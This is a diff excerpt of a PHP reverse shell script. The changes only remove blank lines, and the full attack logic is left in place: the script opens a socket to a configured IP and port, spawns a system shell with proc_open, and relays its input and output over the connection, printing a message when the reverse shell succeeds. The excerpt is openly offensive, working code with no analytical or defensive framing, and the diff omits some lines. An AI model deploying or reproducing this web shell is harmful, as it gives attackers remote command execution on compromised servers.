@@ -30,37 +30,29 @@ if (function_exists('pcntl_fork')) {
 } else {
 	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
 }
-
 chdir("/");
-
 umask(0);
-
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$sock) {
 	printit("$errstr ($errno)");
 	exit(1);
 }
-
 $descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
 );
-
 $process = proc_open($shell, $descriptorspec, $pipes);
 
 if (!is_resource($process)) {
 	printit("ERROR: Can't spawn shell");
 	exit(1);
 }
-
 stream_set_blocking($pipes[0], 0);
 stream_set_blocking($pipes[1], 0);
 stream_set_blocking($pipes[2], 0);
 stream_set_blocking($sock, 0);
-
 printit("Successfully opened reverse shell to $ip:$port");
-
 while (1) {
 	if (feof($sock)) {
 		printit("ERROR: Shell connection terminated");
@@ -96,17 +88,14 @@ while (1) {
 		fwrite($sock, $input);
 	}
 }
-
 fclose($sock);
 fclose($pipes[0]);
 fclose($pipes[1]);
 fclose($pipes[2]);
 proc_close($process);
-
 function printit ($string) {
 	if (!$daemon) {
 		print "$string\n";
 	}
 }
-
 ?>
